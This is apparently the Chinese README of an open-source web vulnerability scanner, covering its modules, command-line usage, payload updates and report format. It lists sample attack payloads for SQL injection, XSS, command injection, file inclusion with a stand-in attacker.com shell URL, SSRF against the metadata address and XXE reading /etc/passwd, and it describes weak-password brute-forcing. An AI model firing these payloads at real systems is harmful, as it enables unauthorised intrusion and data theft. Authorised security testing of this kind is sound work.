# VulnScanner — 企业级全量漏洞扫描器

Python 3.9+  
License: MIT  
PRs Welcome  
GitHub stars

> ****一键发现所有现存漏洞，让安全测试更简单、更全面、更智能。**** 🚀

VulnScanner 是一款功能强大的自动化网站漏洞扫描工具，支持****联网更新漏洞库****、覆盖 ****12+ 漏洞类型****、内置 ****智能爬虫引擎****，能够帮助企业安全团队和渗透测试人员快速发现 Web 应用中的安全隐患。

  

  

## 📖 目录

-   项目简介
-   功能特色
-   系统架构
-   安装指南
-   快速使用
-   模块详解
-   联网更新机制
-   报告示例
-   贡献指南
-   许可证
-   联系我们

  

  

## 📝 项目简介

VulnScanner 是一套****企业级全量漏洞扫描解决方案****，它不仅仅是一个简单的扫描脚本，而是一个完整的、可扩展的安全检测平台。它能够：

-   从目标 URL 出发，自动发现所有页面和参数
-   联网获取最新的漏洞 Payload 和 CVE 数据
-   覆盖 OWASP Top 10 及更多常见漏洞类型
-   生成结构化的专业安全报告

无论你是安全运维人员、渗透测试工程师，还是希望提升项目安全性的开发者，VulnScanner 都能为你提供专业、高效的安全检测能力。

  

## ✨ 功能特色

VulnScanner 区别于普通扫描器的****核心优势****：

| 特性        | 说明                                              |
| --------- | ----------------------------------------------- |
| 🔄 联网更新   | 启动时自动从 GitHub、NVD 等源拉取最新 Payload 和 CVE 数据       |
| 🕷️ 智能爬虫  | 支持 BFS/DFS 双模式、JavaScript 渲染页面解析、表单自动填充         |
| 🔍 全类型检测  | 覆盖 SQL 注入、XSS、RCE、文件包含、SSRF、XXE、CSRF 等 12+ 漏洞类型 |
| 📡 CVE 匹配 | 根据服务器指纹自动匹配已知 CVE 漏洞并验证                         |
| 📊 专业报告   | 自动生成 Markdown/HTML 格式报告，按危险等级分类并附带修复建议          |
| ⚡ 高性能     | 支持异步并发扫描，速率可控，避免影响目标业务                          |
| 🔧 扩展性强   | 模块化设计，可轻松添加新的检测模块                               |

  

  

## 🏗️ 系统架构

vuln\_scanner/  
├── scanner.py                    # 主入口，参数解析与调度  
├── crawler/                      # 爬虫模块  
│   ├── spider.py                 # 智能爬虫（BFS/DFS）  
│   └── parser.py                 # HTML/JS 解析器  
├── detectors/                    # 漏洞检测模块  
│   ├── base.py                   # 检测基类（抽象接口）  
│   ├── sqli.py                   # SQL注入检测  
│   ├── xss.py                    # XSS跨站脚本检测  
│   ├── rce.py                    # 命令/代码执行检测  
│   ├── file\_inc.py               # 文件包含检测（LFI/RFI）  
│   ├── upload.py                 # 文件上传漏洞检测  
│   ├── ssrf.py                   # SSRF服务器端请求伪造检测  
│   ├── xxe.py                    # XXE外部实体注入检测  
│   ├── csrf.py                   # CSRF跨站请求伪造检测  
│   ├── directory.py              # 目录遍历与敏感文件检测  
│   ├── info\_leak.py              # 信息泄露检测  
│   ├── weak\_pass.py              # 弱口令检测  
│   └── cve.py                    # CVE已知漏洞检测  
├── update/                       # 漏洞库更新模块  
│   └── updater.py                # 联网自动更新  
├── report/                       # 报告生成模块  
│   └── reporter.py               # Markdown/HTML/JSON 报告  
├── payloads/                     # Payload字典目录  
│   ├── sqli.txt                  # SQL注入Payload（500+）  
│   ├── xss.txt                   # XSS Payload（300+）  
│   ├── dirs.txt                  # 敏感路径字典（2000+）  
│   └── passwords.txt             # 弱口令字典（1000+）  
└── lib/                          # 工具库  
    └── common.py                 # 通用函数（请求、日志、代理等）

  

  

## 🔧 安装指南

### 系统要求

-   Python 3.9 或更高版本
-   操作系统：Windows / macOS / Linux
-   网络连接（用于联网更新漏洞库）

### 安装步骤

****Step 1：克隆仓库****

git clone https://github.com/yourusername/vulnscanner.git  
cd vulnscanner

****Step 2：创建虚拟环境（推荐）****

python -m venv venv  
source venv/bin/activate    # Linux/macOS  
venv\\Scripts\\activate       # Windows

****Step 3：安装依赖****

```
pip install -r requirements.txt
```

****Step 4：验证安装****

```
python scanner.py --help
```

如果看到帮助信息，说明安装成功！

  

## 🚀 快速使用

### 基础扫描

\# 扫描单个目标  
python scanner.py -u https://example.com  
  
\# 指定并发数（默认5）  
python scanner.py -u https://example.com -t 10  
  
\# 指定爬虫深度（默认3）  
python scanner.py -u https://example.com -d 5

### 批量扫描

\# 从文件读取目标列表  
python scanner.py -f targets.txt

`targets.txt` 文件格式（每行一个 URL）：

https://target1.com  
https://target2.com  
https://target3.com

### 选择性扫描

\# 只检测 SQL 注入和 XSS  
python scanner.py -u https://example.com -m sqli,xss  
  
\# 扫描所有模块（默认）  
python scanner.py -u https://example.com -m all

### 进阶用法

\# 使用代理  
python scanner.py -u https://example.com --proxy http://127.0.0.1:8080  
  
\# 深度扫描模式（启用JS渲染）  
python scanner.py -u https://example.com --deep  
  
\# 强制更新漏洞库  
python scanner.py -u https://example.com --update  
  
\# 自定义字典  
python scanner.py -u https://example.com --dict ./my\_dict.txt  
  
\# 输出报告到指定位置  
python scanner.py -u https://example.com --output ./report.md

### 参数说明

| 参数       | 说明             | 默认值         | 示例                    |
| -------- | -------------- | ----------- | --------------------- |
| -u       | 目标 URL         | 必填          | https://example.com   |
| -f       | 目标文件（每行一个 URL） | 无           | targets.txt           |
| -t       | 并发线程数          | 5           | -t 10                 |
| -d       | 爬虫深度           | 3           | -d 5                  |
| -m       | 检测模块（逗号分隔）     | all         | -m sqli,xss           |
| --proxy  | HTTP/HTTPS 代理  | 无           | http://127.0.0.1:8080 |
| --delay  | 请求延迟（秒）        | 1           | --delay 2             |
| --deep   | 深度模式（启用 JS 渲染） | False       | --deep                |
| --update | 强制更新漏洞库        | False       | --update              |
| --output | 报告输出路径         | ./report.md | --output result.html  |

  

## 🔍 模块详解

每个检测模块都独立封装，采用统一的接口设计，方便扩展和维护。

### 1\. 💉 SQL注入检测 (`sqli.py`)

-   ****检测方式****：基于错误信息检测 + 布尔盲注 + 时间盲注
-   ****Payload 数量****：500+ 条，联网实时更新
-   ****绕过技术****：URL 编码、注释符绕过、大小写混合
-   ****检测示例****：
    
    ' OR '1'='1  
    ' UNION SELECT NULL--  
    ' AND SLEEP(5)--
    

### 2\. 🎯 XSS检测 (`xss.py`)

-   ****覆盖类型****：反射型、存储型、DOM 型
-   ****Payload 示例****：
    
    <script>alert('XSS')</script>  
    <img src=x onerror=alert(1)>  
    <svg onload=alert(1)>
    
-   ****绕过检测****：Unicode 编码、HTML 实体编码、双写绕过

### 3\. 🖥️ 命令/代码执行检测 (`rce.py`)

-   ****测试方式****：参数注入系统命令 + 时间盲注
-   ****Payload 示例****：
    
    ;id  
    |whoami  
    &&dir  
    \`sleep 5\`
    

### 4\. 📁 文件包含检测 (`file_inc.py`)

-   ****LFI 测试****：`../../etc/passwd`、`php://filter`
-   ****RFI 测试****：`http://attacker.com/shell.txt`
-   ****检测依据****：响应中是否包含目标文件内容

### 5\. 📤 文件上传检测 (`upload.py`)

-   ****检测点****：未验证类型、绕过前端验证
-   ****测试****：上传后是否能通过 URL 访问

### 6\. 🌐 SSRF检测 (`ssrf.py`)

-   ****测试方式****：内网地址注入 + DNS 外带检测
-   ****Payload 示例****：`http://127.0.0.1:22`、`http://169.254.169.254/`

### 7\. 📄 XXE检测 (`xxe.py`)

-   ****测试方式****：修改 POST 请求的 XML 体，插入外部实体
-   ****Payload 示例****：
    
    <?xml version="1.0"?>  
    <!DOCTYPE foo \[<!ENTITY xxe SYSTEM "file:///etc/passwd">\]>  
    <root>&xxe;</root>
    

### 8\. 🔐 CSRF检测 (`csrf.py`)

-   ****检测方式****：检查表单 Token、Header Token
-   ****测试****：对无保护的敏感操作发起跨域请求

### 9\. 📂 目录扫描 (`directory.py`)

-   ****内置字典****：2000+ 条常见路径
-   ****双重验证****：状态码 + 页面关键词
-   ****常见发现****：`/admin`、`/backup`、`/.git/config`、`/wp-config.php.bak`

### 10\. 🔓 信息泄露检测 (`info_leak.py`)

-   ****检测内容****：
-   -   phpinfo 页面
    -   数据库连接信息泄露
    -   源代码泄露（`.git`、`.svn`）
    -   错误信息堆栈（Debug 模式）
    -   邮箱地址、API 密钥泄露

### 11\. 🔑 弱口令检测 (`weak_pass.py`)

-   ****检测范围****：后台登录、FTP/SSH、数据库服务
-   ****内置字典****：1000+ 常用弱密码

### 12\. 🛡️ CVE已知漏洞检测 (`cve.py`)

-   ****技术方案****：
-   1.  根据 HTTP 头识别服务器版本
    2.  根据页面特征识别 CMS 系统
    3.  联网匹配 CVE 数据库
    4.  发送验证 Payload
-   ****常见检测项****：
-   -   Apache Struts2 RCE（CVE-2017-5638）
    -   ThinkPHP RCE
    -   WordPress 插件漏洞
    -   Log4j RCE（CVE-2021-44228）
    -   Spring4Shell（CVE-2022-22965）

  

  

## 🔄 联网更新机制

这是 VulnScanner ****区别于传统扫描器的核心功能****。

### 自动更新流程

启动扫描器  
    ↓  
检查本地漏洞库版本  
    ↓  
联网检查最新版本（从 GitHub / NVD / CIRCL 等源）  
    ↓  
   ├── 有更新 → 自动下载并缓存最新 Payload  
   │   ├── 成功 → 使用新库扫描  
   │   └── 失败 → 回滚到上一个稳定版本  
   └── 无更新 → 使用本地库扫描  
    ↓  
扫描完成后记录当前版本号

### Payload 更新来源

| 漏洞类型  | 更新来源                                  |
| ----- | ------------------------------------- |
| SQL注入 | payloadbox/sql-injection-payload-list |
| XSS   | payloadbox/xss-payload-list           |
| XXE   | payloadbox/xxe-injection-payload-list |
| 目录扫描  | danielmiessler/SecLists               |
| 弱口令   | danielmiessler/SecLists               |
| CVE   | NVD NIST API + CIRCL CVE API          |

### 更新频率

-   默认每 ****24 小时**** 自动检查一次
-   可通过 `--update` 参数强制立即更新

  

  

## 📊 报告示例

扫描完成后，VulnScanner 会生成结构化的安全报告。

### 控制台实时输出

\[2026-06-06 14:30:25\] \[爬虫\] 已发现 47 个页面，93 个参数  
\[2026-06-06 14:30:27\] \[SQL注入\] \[高危\] https://target.com/page?id=1 - 错误信息回显  
\[2026-06-06 14:30:30\] \[XSS\] \[中危\] https://target.com/search?q= - 反射型XSS  
\[2026-06-06 14:30:35\] \[CVE\] \[高危\] Apache Struts2 - CVE-2017-5638 - RCE漏洞

### Markdown 报告结构

\# 安全扫描报告  
  
\## 扫描概览  
\- \*\*目标\*\*: https://example.com  
\- \*\*扫描时间\*\*: 2026-06-06 14:30:00 - 14:45:00  
\- \*\*总请求数\*\*: 1,234  
\- \*\*发现漏洞\*\*: 5 个  
  
\---  
  
\## 高危漏洞  
  
\### 1. SQL注入（高危）  
\- \*\*URL\*\*: https://example.com/product?id=1  
\- \*\*Payload\*\*: \`' OR '1'='1\`  
\- \*\*检测方法\*\*: 错误信息回显  
\- \*\*修复建议\*\*:  
  1. 使用参数化查询（Prepared Statement）  
  2. 对用户输入进行严格过滤和转义  
  3. 关闭数据库错误信息显示  
  
\---  
  
\## 中危漏洞  
  
\### 2. 反射型XSS（中危）  
\- \*\*URL\*\*: https://example.com/search?q=  
\- \*\*Payload\*\*: \`<script>alert('XSS')</script>\`  
\- \*\*检测方法\*\*: Payload 反射检测  
\- \*\*修复建议\*\*:  
  1. 对输出进行 HTML 实体编码  
  2. 设置 Content-Security-Policy 头  
  
\---  
  
\## 资产清单  
\- 发现页面：47 个  
\- 发现参数：93 个  
\- 发现表单：12 个

此外还支持 ****HTML 报告****（交互式图表）和 ****JSON 导出****（便于集成）。

  

## 🤝 贡献指南

欢迎所有开发者参与 VulnScanner 的改进！请遵循以下流程：

1.  ****Fork 仓库****：点击右上角的 "Fork" 按钮
2.  ****创建分支****：`git checkout -b feature/your-feature`
3.  ****提交更改****：`git commit -m "feat: add new detection module"`
4.  ****推送到远程****：`git push origin feature/your-feature`
5.  ****发起 Pull Request****：在 GitHub 上创建 PR

### 代码规范

-   遵循 PEP 8 编码规范
-   所有函数必须有中文注释（功能、参数、返回值）
-   新增检测模块需继承 `BaseDetector` 类
-   提交信息格式：`type: description`（type 可选 feat/fix/docs/refactor）

  

  

## 📜 许可证

本项目采用 ****MIT 许可证****。详情请查看 LICENSE 文件。

  

  

## 📬 联系我们

-   ****项目 Issues****：GitHub Issues
-   ****邮箱****：tyenow@outlook.com
-   ****博客****：https://www.ty2c.com

  

## ⚠️ 法律声明

> ****本工具仅可用于授权范围内的安全测试。****
> 
> 1.  未经授权扫描他人系统属于违法行为
> 2.  使用者须自行承担所有法律后果
> 3.  建议在本地测试环境（如 DVWA、Vulhub）中验证功能
> 4.  请遵守所在国家/地区的法律法规

****VulnScanner**** — 让你的 Web 应用更安全 🔒

  

****如果这个项目对你有帮助，请点亮 ⭐ Star！**** 你的支持是我们前进的动力！🚀
